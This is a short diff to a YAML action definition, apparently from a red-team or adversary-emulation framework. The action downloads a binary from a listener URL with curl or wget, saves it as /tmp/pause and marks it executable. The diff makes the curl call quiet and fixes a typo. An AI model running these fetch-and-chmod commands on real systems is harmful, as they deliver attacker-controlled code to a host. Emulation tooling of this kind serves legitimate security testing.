@@ -9,18 +9,18 @@ parameters:
   DST_BIN:
     type: string
     description: the destination path of the binary at the remote system
-    required: false
 args:
   URL: "${LISTENER}/${FILESHARE_PORT}"
   DST_BIN: "/tmp/pause"
 procedures:
   - key: curl
-    command: curl -L ${URL} -o ${DST_BIN}  && chmod +x ${DST_BIN} 
+    command: curl -sS -L ${URL} -o ${DST_BIN} && chmod +x ${DST_BIN} 
   - key: wget
     command: wget ${URL} -O ${DST_BIN} && chmod +x ${DST_BIN} 
 preconditions:
   kind: System
   accessLevel: "user-exec"
+effects: ["sys.has-binary(${DST_BIN})"]
 # cmd: {}
 # defend: {}
-# refernces:
+# references:
